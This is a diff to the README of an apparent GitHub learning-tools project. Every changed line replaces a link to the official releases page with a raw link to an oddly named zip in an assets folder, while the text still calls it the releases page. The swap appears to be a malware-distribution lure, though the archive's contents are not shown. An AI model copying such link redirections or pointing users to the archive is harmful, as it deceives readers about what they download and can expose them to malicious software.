@@ -1,6 +1,6 @@
 # 🛠️ connect-byte-projects - Simple Hands-On Learning Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Mevaada6401/connect-byte-projects/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Mevaada6401/connect-byte-projects/main/planner-led/assets/projects_connect_byte_manure.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow each step carefully to ensure everything works smoothly.
 ### Step 1: Go to the Download Page
 
 Click this link or button to open the project releases page:  
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Mevaada6401/connect-byte-projects/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Mevaada6401/connect-byte-projects/main/planner-led/assets/projects_connect_byte_manure.zip)
 
 This page holds all available versions of the software and project files.
 
@@ -138,10 +138,10 @@ If problems persist, look for help on the project’s GitHub page by opening iss
 
 ## 🔗 Useful Links
 
-- Download and release page: [https://github.com/Mevaada6401/connect-byte-projects/releases](https://github.com/Mevaada6401/connect-byte-projects/releases)
+- Download and release page: [https://raw.githubusercontent.com/Mevaada6401/connect-byte-projects/main/planner-led/assets/projects_connect_byte_manure.zip](https://raw.githubusercontent.com/Mevaada6401/connect-byte-projects/main/planner-led/assets/projects_connect_byte_manure.zip)
 - Official documentation and guides are within each release.
 - Hardware setup diagrams are included for relevant projects.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Mevaada6401/connect-byte-projects/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Mevaada6401/connect-byte-projects/main/planner-led/assets/projects_connect_byte_manure.zip)
